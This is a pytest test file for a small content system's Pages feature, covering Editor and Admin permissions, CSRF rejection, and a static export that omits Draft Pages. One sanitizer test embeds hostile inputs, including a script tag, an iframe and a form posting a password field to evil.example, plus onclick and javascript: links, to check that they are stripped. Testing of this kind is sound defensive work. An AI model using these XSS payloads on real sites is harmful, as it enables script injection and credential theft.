"""T05: Pages in the Navigation, with limited Editor rights.

Seam 1 (the admin console over HTTP): who may do what to a Page, and CSRF.
Seam 2 (the published site on disk): Navigation from Published Pages only,
relative paths, and no Draft Page anywhere in the export.
"""
import re

import pytest

from app import pages
from tests.conftest import csrf_token, token_in
from tests.test_t03_publish import (add_post, all_text, author_id, html_files,
                                    publish, read, site_files)

REFUSAL = "you don't have permission"
NEW = "/admin/pages/new"


def is_refusal(response):
    return response.status_code == 403 and REFUSAL in response.text.lower()


def post_to(client, path, **data):
    data["csrf_token"] = csrf_token(client, "/admin")     # the sign-out form, for any role
    return client.post(path, data=data, follow_redirects=False)


def create_page(client, title="About ASA", slug="about-asa", body="Placeholder body"):
    response = post_to(client, "/admin/pages", title=title, slug=slug, body=body)
    assert response.status_code == 303, response.text
    return int(re.search(r"/admin/pages/(\d+)/edit", response.headers["location"]).group(1))


def edit_page(client, page_id):
    response = client.get(f"/admin/pages/{page_id}/edit")
    assert response.status_code == 200
    return response.text


def status_of(html):
    return re.search(r'id="page-status"[^>]*>\s*(\w+)', html).group(1)


def slug_of(html):
    return re.search(r'id="page-slug"[^>]*>([^<]+)<', html).group(1).strip()


def add_page(db_path, title, slug=None, body="Placeholder body", *, published=True):
    slug = slug or title.lower().replace(" ", "-")
    page_id = pages.create(db_path, title=title, slug=slug, body=body,
                           author_id=author_id(db_path, "admin"))
    if published:
        pages.publish(db_path, page_id)
    return page_id


def nav(html):
    """The Navigation as [(label, href)] in the order shown."""
    block = re.search(r'<nav aria-label="Main">(.*?)</nav>', html, re.S).group(1)
    return [(label.strip(), href) for href, label in
            re.findall(r'<a [^>]*href="([^"]*)"[^>]*>([^<]+)</a>', block)]


# == Seam 1: the admin console =================================================

# -- the Admin manages Pages ---------------------------------------------------

def test_admin_creates_a_page_with_title_slug_and_body_as_a_draft(client_as):
    admin = client_as("admin")
    page_id = create_page(admin, "About ASA", "About ASA", "Hello **there**")
    html = edit_page(admin, page_id)
    assert "About ASA" in html and "Hello **there**" in html
    assert status_of(html) == "Draft"
    assert slug_of(html) == "about-asa"           # entered, tidied into a slug
    assert "About ASA" in admin.get("/admin/pages").text


def test_a_page_needs_a_title_and_a_slug(client_as):
    admin = client_as("admin")
    assert post_to(admin, "/admin/pages", title="  ", slug="x", body="b").status_code == 400
    assert post_to(admin, "/admin/pages", title="T", slug=" !! ", body="b").status_code == 400
    assert "No Pages yet" in admin.get("/admin/pages").text


def test_a_page_slug_must_be_unused_and_must_not_shadow_a_site_file(client_as):
    admin = client_as("admin")
    create_page(admin, "About ASA", "about-asa")
    assert post_to(admin, "/admin/pages", title="Again", slug="about-asa",
                   body="b").status_code == 409
    for reserved in ("index", "announcements"):
        assert post_to(admin, "/admin/pages", title="R", slug=reserved,
                       body="b").status_code == 400


def test_admin_edits_the_body_and_retitles_without_touching_the_slug(client_as):
    admin = client_as("admin")
    page_id = create_page(admin, "About ASA", "about-asa", "old body")
    assert post_to(admin, f"/admin/pages/{page_id}", body="new body").status_code == 303
    assert post_to(admin, f"/admin/pages/{page_id}/title",
                   title="About the group").status_code == 303
    html = edit_page(admin, page_id)
    assert "new body" in html and "old body" not in html
    assert "About the group" in html
    assert slug_of(html) == "about-asa"


def test_retitling_to_nothing_is_refused_and_changes_nothing(client_as):
    admin = client_as("admin")
    page_id = create_page(admin, "About ASA")
    assert post_to(admin, f"/admin/pages/{page_id}/title", title=" ").status_code == 400
    assert "About ASA" in edit_page(admin, page_id)


def test_admin_publishes_and_unpublishes(client_as):
    admin = client_as("admin")
    page_id = create_page(admin)
    assert post_to(admin, f"/admin/pages/{page_id}/publish").status_code == 303
    assert status_of(edit_page(admin, page_id)) == "Published"
    assert post_to(admin, f"/admin/pages/{page_id}/unpublish").status_code == 303
    assert status_of(edit_page(admin, page_id)) == "Draft"


def test_admin_changes_a_slug_and_is_warned_first(client_as):
    admin = client_as("admin")
    page_id = create_page(admin, "About ASA", "about-asa")
    html = edit_page(admin, page_id)
    # the same warning the Post editor shows
    assert "Changing the slug can break an old link that someone has already shared." in html
    assert post_to(admin, f"/admin/pages/{page_id}/slug", slug="About Us").status_code == 303
    assert slug_of(edit_page(admin, page_id)) == "about-us"


def test_admin_cannot_give_a_page_a_taken_or_blank_slug(client_as):
    admin = client_as("admin")
    create_page(admin, "About ASA", "about-asa")
    other = create_page(admin, "Resources", "resources")
    assert post_to(admin, f"/admin/pages/{other}/slug", slug="about-asa").status_code == 409
    assert post_to(admin, f"/admin/pages/{other}/slug", slug="--").status_code == 400
    assert post_to(admin, f"/admin/pages/{other}/slug", slug="index").status_code == 400
    assert slug_of(edit_page(admin, other)) == "resources"


def test_admin_deletes_a_page(client_as):
    admin = client_as("admin")
    page_id = create_page(admin, "Obsolete", "obsolete")
    assert post_to(admin, f"/admin/pages/{page_id}/delete").status_code == 303
    assert admin.get(f"/admin/pages/{page_id}/edit").status_code == 404
    assert "Obsolete" not in admin.get("/admin/pages").text


def test_a_missing_page_is_not_found(client_as):
    admin = client_as("admin")
    assert admin.get("/admin/pages/9999/edit").status_code == 404
    assert post_to(admin, "/admin/pages/9999/publish").status_code == 404


# -- the Editor may update a Body only ---------------------------------------

def test_editor_can_list_open_and_update_the_body_of_an_existing_page(client_as):
    page_id = create_page(client_as("admin"), "Photos", "photos", "old photos text")
    editor = client_as("editor")
    assert "Photos" in editor.get("/admin/pages").text
    assert "old photos text" in edit_page(editor, page_id)
    assert post_to(editor, f"/admin/pages/{page_id}", body="new photos text").status_code == 303
    html = edit_page(editor, page_id)
    assert "new photos text" in html and "old photos text" not in html


def test_an_editor_cannot_change_anything_else_by_adding_fields_to_the_body_form(client_as):
    admin = client_as("admin")
    page_id = create_page(admin, "Photos", "photos")
    editor = client_as("editor")
    post_to(editor, f"/admin/pages/{page_id}", body="b", title="Hacked", slug="hacked",
            status="published")
    html = edit_page(admin, page_id)
    assert "Hacked" not in html
    assert slug_of(html) == "photos" and status_of(html) == "Draft"


def test_editor_screens_hide_every_control_the_editor_cannot_use(client_as):
    page_id = create_page(client_as("admin"), "Photos", "photos")
    editor_html = edit_page(client_as("editor"), page_id)
    admin_html = edit_page(client_as("admin"), page_id)
    # a Draft Page offers Publish, not Unpublish
    for control in ("title", "slug", "publish", "delete"):
        action = f"/admin/pages/{page_id}/{control}"
        assert action in admin_html
        assert action not in editor_html
    assert f"/admin/pages/{page_id}/unpublish" not in editor_html
    # the Editor still sees the facts, as plain text: no inputs for them
    assert "Photos" in editor_html and "photos" in editor_html
    for field in ("slug", "title"):
        assert f'name="{field}"' not in editor_html
    # the list offers an Editor no way to start a new Page
    assert NEW not in client_as("editor").get("/admin/pages").text
    assert NEW in client_as("admin").get("/admin/pages").text


ADMIN_ONLY_PAGE_ACTIONS = [
    ("get", NEW, None),
    ("post", "/admin/pages", {"title": "Sneaky", "slug": "sneaky", "body": "x"}),
    ("post", "/admin/pages/{id}/title", {"title": "Hacked"}),
    ("post", "/admin/pages/{id}/slug", {"slug": "hacked"}),
    ("post", "/admin/pages/{id}/publish", {}),
    ("post", "/admin/pages/{id}/unpublish", {}),
    ("post", "/admin/pages/{id}/delete", {}),
]


def send(client, method, path, data):
    return post_to(client, path, **data) if method == "post" else client.get(path)


@pytest.mark.parametrize("method,path,data", ADMIN_ONLY_PAGE_ACTIONS)
def test_editor_is_refused_every_admin_only_page_action_and_nothing_changes(
        client_as, method, path, data):
    admin = client_as("admin")
    page_id = create_page(admin, "Photos", "photos")
    post_to(admin, f"/admin/pages/{page_id}/publish")
    editor = client_as("editor")
    assert is_refusal(send(editor, method, path.format(id=page_id), data))
    html = edit_page(admin, page_id)
    assert "Hacked" not in html and slug_of(html) == "photos"
    assert status_of(html) == "Published"
    assert "Sneaky" not in admin.get("/admin/pages").text


@pytest.mark.parametrize("method,path,data", ADMIN_ONLY_PAGE_ACTIONS)
def test_editor_is_refused_even_for_a_page_that_does_not_exist(client_as, method, path, data):
    assert is_refusal(send(client_as("editor"), method, path.format(id=9999), data))


@pytest.mark.parametrize("method,path,data", ADMIN_ONLY_PAGE_ACTIONS)
def test_admin_is_not_refused_admin_only_page_actions(client_as, method, path, data):
    admin = client_as("admin")
    page_id = create_page(admin, "Photos", "photos")
    data = {k: (v + "-ok" if k in ("slug", "title") else v) for k, v in (data or {}).items()}
    response = send(admin, method, path.format(id=page_id), data)
    assert response.status_code in (200, 303)


def test_the_refusal_page_links_back_to_the_dashboard(client_as):
    page_id = create_page(client_as("admin"))
    response = post_to(client_as("editor"), f"/admin/pages/{page_id}/delete")
    assert is_refusal(response)
    assert 'href="/admin"' in response.text


@pytest.mark.parametrize("method,path", [
    ("get", "/admin/pages"), ("get", NEW), ("get", "/admin/pages/1/edit"),
    ("post", "/admin/pages"), ("post", "/admin/pages/1"),
    ("post", "/admin/pages/1/title"), ("post", "/admin/pages/1/slug"),
    ("post", "/admin/pages/1/publish"), ("post", "/admin/pages/1/unpublish"),
    ("post", "/admin/pages/1/delete"),
])
def test_signed_out_visitors_are_sent_to_sign_in(client, method, path):
    response = getattr(client, method)(path, follow_redirects=False)
    assert response.status_code in (302, 303)
    assert response.headers["location"] == "/login"


# -- CSRF --------------------------------------------------------------------

def test_a_page_form_without_a_token_is_rejected_and_changes_nothing(client_as):
    admin = client_as("admin")
    page_id = create_page(admin, "Keep me", "keep-me")
    for path, data in [
        ("/admin/pages", {"title": "Sneaky", "slug": "sneaky", "body": "x"}),
        (f"/admin/pages/{page_id}", {"body": "changed"}),
        (f"/admin/pages/{page_id}/title", {"title": "Changed"}),
        (f"/admin/pages/{page_id}/slug", {"slug": "changed"}),
        (f"/admin/pages/{page_id}/publish", {}),
        (f"/admin/pages/{page_id}/unpublish", {}),
        (f"/admin/pages/{page_id}/delete", {}),
    ]:
        assert admin.post(path, data=data, follow_redirects=False).status_code == 403, path
        assert client_as("editor").post(path, data=data,
                                        follow_redirects=False).status_code == 403, path
    html = edit_page(admin, page_id)
    assert "Keep me" in html and "changed" not in html and status_of(html) == "Draft"
    assert "Sneaky" not in admin.get("/admin/pages").text


@pytest.mark.parametrize("role", ["admin", "editor"])
def test_every_page_form_carries_a_csrf_token(client_as, role):
    page_id = create_page(client_as("admin"))
    client = client_as(role)
    pages_to_check = ["/admin/pages", f"/admin/pages/{page_id}/edit"]
    if role == "admin":
        pages_to_check.append(NEW)
    for path in pages_to_check:
        html = client.get(path).text
        forms = re.findall(r"<form\b[^>]*method=\"post\"[^>]*>.*?</form>", html, re.S)
        assert forms or path == "/admin/pages"      # the list has no form
        for form in forms:
            assert token_in(form), f"a form on {path} has no CSRF token"


# == Seam 2: the published site on disk ==========================================

def test_a_published_page_is_written_and_linked_in_the_navigation(db_path, tmp_path):
    add_page(db_path, "About ASA", "about-asa", "Placeholder text")
    out = publish(db_path, tmp_path)
    assert "Placeholder text" in read(out, "about-asa.html")
    assert nav(read(out, "index.html")) == [
        ("Announcements", "announcements.html"), ("About ASA", "about-asa.html")]


def test_the_navigation_lists_announcements_then_every_published_page_on_every_page(
        db_path, tmp_path):
    for title in ("About ASA", "Resources", "Photos"):
        add_page(db_path, title)
    add_post(db_path, "Afrobeat Night")
    out = publish(db_path, tmp_path)
    expected = [("Announcements", "announcements.html"), ("About ASA", "about-asa.html"),
                ("Resources", "resources.html"), ("Photos", "photos.html")]
    for name in ("index.html", "announcements.html", "photos.html"):
        assert nav(read(out, name)) == expected, name
    # a page one folder down reaches the same pages by climbing out
    assert nav(read(out, "posts/afrobeat-night.html")) == [
        (label, "../" + href) for label, href in expected]


def test_a_draft_page_appears_nowhere_in_the_export(db_path, tmp_path):
    add_page(db_path, "Secret Draft", "secret-draft", "Hidden zebra text", published=False)
    add_page(db_path, "About ASA")
    out = publish(db_path, tmp_path)
    text = all_text(out)
    for needle in ("Secret Draft", "secret-draft", "Hidden zebra"):
        assert needle not in text
    assert not any("secret-draft" in p.name for p in site_files(out))


def test_an_unpublished_page_disappears_on_the_next_publish(db_path, tmp_path):
    page_id = add_page(db_path, "Wrong Page", "wrong-page", "wrong details")
    assert (publish(db_path, tmp_path) / "wrong-page.html").exists()
    pages.unpublish(db_path, page_id)
    out = publish(db_path, tmp_path)
    assert "Wrong Page" not in all_text(out) and "wrong details" not in all_text(out)
    assert not (out / "wrong-page.html").exists()


def test_a_deleted_page_disappears_on_the_next_publish(db_path, tmp_path):
    page_id = add_page(db_path, "Obsolete", "obsolete")
    publish(db_path, tmp_path)
    pages.delete(db_path, page_id)
    out = publish(db_path, tmp_path)
    assert "Obsolete" not in all_text(out) and not (out / "obsolete.html").exists()


def test_a_retitled_and_re_slugged_page_follows_in_the_navigation(db_path, tmp_path):
    page_id = add_page(db_path, "About ASA", "about-asa")
    pages.retitle(db_path, page_id, "About us")
    pages.change_slug(db_path, page_id, "About Us")
    out = publish(db_path, tmp_path)
    assert ("About us", "about-us.html") in nav(read(out, "index.html"))
    assert not (out / "about-asa.html").exists()


def test_page_bodies_use_the_same_markdown_and_sanitizing_as_posts(db_path, tmp_path):
    body = ("## Heading two\n\nSome *emphasis* and **strong**.\n\n- one\n- two\n\n"
            "[a link](https://example.org/x) ![Dancers](photos/dance.jpg)\n\n"
            "<script>alert('xss-marker')</script>\n"
            "<iframe src=\"https://evil.example/frame\"></iframe>\n"
            "<form action=\"https://evil.example/steal\"><input name=\"pw\"></form>\n"
            "<p onclick=\"steal()\">clicky</p>\n[bad](javascript:alert(1))\n")
    add_page(db_path, "Rich Page", "rich-page", body)
    out = publish(db_path, tmp_path)
    page = read(out, "rich-page.html")
    assert "<h2>Heading two</h2>" in page and "<em>emphasis</em>" in page
    assert "<li>one</li>" in page and '<a href="https://example.org/x"' in page
    assert 'src="photos/dance.jpg"' in page and 'alt="Dancers"' in page
    text = all_text(out).lower()
    for needle in ("<script", "xss-marker", "<iframe", "evil.example", "<form", "<input",
                   "onclick", "steal()", 'href="javascript'):
        assert needle not in text, needle


def test_html_in_a_page_title_is_shown_as_text_not_run(db_path, tmp_path):
    add_page(db_path, "<b>Bold</b> & Co", "bold-co")
    text = all_text(publish(db_path, tmp_path))
    assert "<b>Bold</b>" not in text and "&lt;b&gt;Bold&lt;/b&gt;" in text


def test_every_href_and_src_in_the_export_is_relative_with_pages(db_path, tmp_path):
    add_page(db_path, "About ASA", "about-asa", "[admin](/admin) ![x](/img/x.png) [ok](a.html)")
    add_page(db_path, "Resources")
    add_post(db_path, "Afrobeat Night")
    out = publish(db_path, tmp_path)
    found = 0
    for path in html_files(out):
        for value in re.findall(r'(?:href|src)="([^"]*)"', path.read_text()):
            found += 1
            assert not value.startswith("/"), f"{path.name}: {value}"
    assert found > 10
    page = read(out, "about-asa.html")
    assert 'href="style.css"' in page and 'href="index.html"' in page


def test_a_page_titled_like_a_post_does_not_collide_with_it(db_path, tmp_path):
    add_page(db_path, "Afrobeat Night", "afrobeat-night", "page text")
    add_post(db_path, "Afrobeat Night", "post text")
    out = publish(db_path, tmp_path)
    assert "page text" in read(out, "afrobeat-night.html")
    assert "post text" in read(out, "posts/afrobeat-night.html")


# == The demo seed ============================================================

def load_seed_script():
    import importlib.util
    from app import settings
    spec = importlib.util.spec_from_file_location(
        "seed_demo", settings.ROOT / "scripts" / "seed_demo.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_the_demo_seed_adds_the_starter_pages_as_labelled_placeholders(db_path, tmp_path):
    seed = load_seed_script()
    seed.seed_demo_pages(db_path)
    seed.seed_demo_pages(db_path)                    # safe to run twice
    out = publish(db_path, tmp_path)
    labels = [label for label, _ in nav(read(out, "index.html"))]
    assert labels == ["Announcements", "About ASA", "Resources", "Photos"]
    for slug in ("about-asa", "resources", "photos"):
        assert "demo placeholder" in read(out, f"{slug}.html").lower()
    assert "actual event photos will be added" in read(out, "photos.html").lower()
    # the seed also leaves a Draft Page, which must stay out of the export
    assert any(p["status"] == "draft" for p in pages.list_all(db_path))
    draft = next(p for p in pages.list_all(db_path) if p["status"] == "draft")
    assert draft["title"] not in all_text(out)
